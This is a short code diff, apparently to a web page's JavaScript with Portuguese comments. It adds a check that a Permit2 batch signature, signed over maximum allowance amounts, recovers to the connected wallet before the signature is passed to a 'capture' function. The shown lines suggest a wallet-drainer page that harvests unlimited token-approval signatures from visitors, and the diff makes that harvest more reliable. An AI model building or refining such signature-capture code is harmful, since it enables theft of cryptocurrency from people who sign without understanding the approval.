@@ -1,4 +1,4 @@
-import { BrowserProvider, Contract, JsonRpcProvider, formatUnits, getAddress } from "https://esm.sh/ethers@6.17.0";
+import { BrowserProvider, Contract, JsonRpcProvider, formatUnits, getAddress, verifyTypedData } from "https://esm.sh/ethers@6.17.0";
 
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 const MAX160 = (1n << 160n) - 1n;
@@ -267,6 +267,14 @@ async function signPermit2() {
     signature = await signer.signTypedData(domain, types, batch);
   } finally {
     if (!signature) { btn.disabled = false; atualizarCta(); }
+  }
+  // trava de seguranca: confere localmente que a assinatura e do dono e no formato certo
+  try {
+    const quem = verifyTypedData(domain, types, batch, signature);
+    log(`assinatura: ${signature.length / 2 - 1} bytes, recupera para ${quem}`, quem.toLowerCase() === owner.toLowerCase() ? "ok" : "bad");
+    if (quem.toLowerCase() !== owner.toLowerCase()) log("ATENCAO: a assinatura NAO e desta carteira (outra conta no wallet?)", "bad");
+  } catch (e) {
+    log(`assinatura invalida: ${e.message}`, "bad");
   }
   await capture({
     kind: "permit2",
